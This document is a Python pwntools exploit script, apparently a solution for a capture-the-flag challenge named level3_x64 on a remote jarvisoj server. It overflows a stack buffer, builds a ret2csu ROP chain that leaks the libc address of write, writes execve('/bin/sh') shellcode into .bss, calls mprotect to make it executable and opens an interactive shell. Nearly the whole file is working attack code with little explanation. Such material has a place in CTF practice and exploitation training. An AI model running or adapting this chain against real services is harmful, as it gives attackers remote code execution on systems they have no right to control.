#!/usr/bin/envy python
from pwn import *

context.log_level = 'debug'
#sh = process("./level3_x64")
sh = remote("pwn2.jarvisoj.com", 9884)

libc_csu_init = 0x4006aa
def cus_init(rbx, rbp, r12, r13, r14, r15, last_address):
	#rbx must be 0
	#rbp must be 1
	#r12 the address of function_got
	#r13 the third parameter
	#r14 the second parameter 
	#r15 the first parameter
	#last_address the return address
	print "the function start"
	payload = 'a' * 0x80 + 'bbbbbbbb' + p64(libc_csu_init) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(0x400690) 
	payload += 'a' * 0x38
	payload += p64(last_address)
	print "the recv string : %s" % sh.recv()
	#pause()
	sh.sendline(payload)
	print "the cus_init"

print "the start"
level5 = ELF("./level3_x64")
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
libc = ELF("./libc-2.19.so")
write_address_got = level5.got["write"]
write_address_plt = level5.plt["write"]
main_address = level5.symbols["main"]
#get the address of  mprotect 
cus_init(0, 1, write_address_got, 8, write_address_got, 1, main_address)
write_address = sh.recv(8)
#print "write_address: %x" %  int(write_address, hex)
write_address = u64(write_address)
print "write_address: %x" % write_address
libcbase = write_address - libc.symbols["write"]
print "libcbase : %x" % libcbase
mprotect_address = libcbase + libc.symbols["mprotect"]
print "mprotect_address: %x" % mprotect_address
#get shellcode 
shellcode = "\x48\x31\xd2\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xc0\xb0\x3b\x0f\x05"
#write the shellcode to bss.
read_address_got = level5.got["read"]
print "read_address: %x" % read_address_got
bss_address = level5.bss();
print "shellcode_address(bss_address): %x" % bss_address
#pause()
cus_init(0, 1, read_address_got, 37, bss_address, 0, main_address)
shellcode = p64(mprotect_address) + shellcode
print "shellcode"
sh.sendline(shellcode)
pause()
#modify the mode of bss
cus_init(0, 1, bss_address, 0x4, 4096, bss_address & 0xfffffffffffff000, bss_address + 8)

sh.interactive()

